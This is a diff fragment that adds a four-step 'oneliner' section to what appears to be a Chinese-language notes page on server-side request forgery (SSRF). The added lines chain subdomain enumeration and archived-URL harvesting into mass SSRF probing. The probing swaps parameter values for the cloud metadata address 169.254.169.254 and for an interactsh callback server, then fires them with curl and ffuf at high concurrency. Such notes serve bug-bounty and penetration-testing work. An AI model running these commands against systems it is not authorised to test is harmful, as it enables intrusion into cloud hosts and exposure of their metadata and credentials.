@@ -70,6 +70,41 @@ Content-Type: image/svg+xml
 
 
 
+## oneliner
+
+1/4
+
+```
+cat params.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I host -P 50 bash -c "curl -ks 'host' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - X \n \"" | grep "VULN"
+```
+
+2/4
+
+```
+cat ssrf.txt | qsreplace "interactsh server ID" | anew -q ssrf_test.txt
+ffuf -w ssrf_test.txt -u FUZZ -p "0.6-1.2" -H "(header in thread)" -t 200 -s
+```
+
+3/4
+
+```
+subfinder -d http://target.com -all -silent | httpx -silent -threads 500 | anew -q subdomains.txt
+
+cat subdomains.txt | gauplus --random-agent -b png,jpg,svg,gif -t 500 | anew -q gau_output.txt
+```
+
+4/4
+
+```
+cat subdomains.txt | xargs -P 30 -I host bash -c "echo host | waybackurls | anew -q wayback_output.txt"
+
+cat wayback_output.txt gau_output.txt | urldedupe -s | anew -q params.txt
+
+cat parameters.txt | gf ssrf | anew -q ssrf.txt
+```
+
+
+
 ## 相关的在线工具
 
 记录触发点:
